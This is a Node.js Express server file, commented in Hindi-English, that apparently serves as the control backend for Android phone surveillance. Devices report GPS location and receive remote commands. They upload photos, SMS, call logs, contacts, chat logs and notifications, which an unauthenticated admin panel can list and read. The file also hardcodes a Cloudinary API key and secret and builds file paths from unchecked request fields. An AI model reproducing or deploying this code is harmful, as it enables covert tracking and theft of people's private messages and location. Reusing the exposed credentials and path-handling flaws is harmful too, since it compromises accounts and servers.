const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2; // ADDED: Cloudinary Import

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. CLOUDINARY CONFIG (Tumhari Details) ---
cloudinary.config({
  cloud_name: 'dxnh5vuik',
  api_key: '185953318184881',
  api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));

// Limits badhaya taaki badi photos aur logs aa sakein
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// In-Memory Storage for Live Status
let devicesStatus = {}; 

// ==================================================
//  NEW GALLERY SYSTEM (CLOUDINARY) - START
// ==================================================

// A. PHOTO UPLOAD ROUTE (Android se aayega)
app.post('/api/upload-image', (req, res) => {
    // Android "image_data" (Base64) aur "device_id" bhejega
    let { device_id, image_data } = req.body;

    if (!device_id || !image_data) {
        return res.status(400).json({ error: "No Data Received" });
    }

    const id = device_id.toString().trim().toUpperCase();

    // Cloudinary pe upload (Ram se seedha Cloud)
    cloudinary.uploader.upload("data:image/jpeg;base64," + image_data, 
        { 
            folder: id, // Device ID ka Folder banega
            public_id: Date.now().toString(), // File name = Time
            width: 800, // Thoda compress (Resize)
            crop: "limit"
        },
        function(error, result) {
            if (error) {
                console.error("❌ Cloudinary Error:", error);
                return res.status(500).json({ error: "Upload Failed" });
            }
            console.log(`📸 [GALLERY] New Photo Uploaded for ${id}`);
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// B. GALLERY LIST ROUTE (Website "Load More" ke liye use karegi)
app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null; // Load More token

    // Cloudinary se list maango
    cloudinary.api.resources({
        type: 'upload',
        prefix: id + "/", // Folder name match karo
        max_results: 5,   // Ek baar mein 5 photos
        next_cursor: next_cursor, 
        context: true
    }, 
    function(error, result) {
        if (error) {
            // Agar folder nahi mila (Matlab koi photo nahi hai abhi)
            return res.json({ photos: [], next_cursor: null });
        }

        // Sirf URL bhejo website ko
        const photos = result.resources.map(img => img.secure_url);
        
        res.json({ 
            photos: photos, 
            next_cursor: result.next_cursor // Agle page ka token
        });
    });
});

// ==================================================
//  NEW GALLERY SYSTEM - END
// ==================================================


// --- 3. ADMIN DASHBOARD ROUTES ---

// Saare devices ki list mangne ke liye
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// Single device ka status check karne ke liye
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    if (!device) return res.json({ id: id, isOnline: false });
    
    // Agar last seen 60 seconds ke andar hai to Online maano
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// --- 4. PHONE CONNECTION (PING) ---
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // --- COMMAND HANDLING ---
        let pendingCommand = "none";
        
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; // Clear after sending
        }

        let finalBattery = battery || level || 0;
        let isCharging = (String(charging) === "true");
        let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
        let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);

        // Status Update
        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
            battery: finalBattery,
            version: version || "--",
            charging: isCharging,
            lat: currentLat,
            lon: currentLon,
            lastSeen: Date.now(),
            command: devicesStatus[id] ? devicesStatus[id].command : "none" 
        };

        if(pendingCommand !== "none") {
            console.log(`📡 [PING] ${id} Command Sent: ${pendingCommand}`);
        }

        res.json({ status: "success", command: pendingCommand });

    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// --- 5. COMMAND SENDING ---
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 [ADMIN] Sending Command '${command}' to Device ${id}`);
    
    res.json({ status: "success", command: command });
});

// --- 6. DATA UPLOAD (Logs, Contacts, SMS, Location) ---
// Note: Ye data abhi bhi JSON files me save hoga (Ephemeral)
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // --- A. LOCATION HANDLING ---
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
            console.log(`📍 [LOCATION] Updated for ${id}`);
        }
        
        // --- B. LIST DATA (SMS, Logs, etc.) ---
        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id}`);
        } 
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// Admin panel file dekhne ke liye yahan request karega (SMS/Logs etc)
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

// Server Start
app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
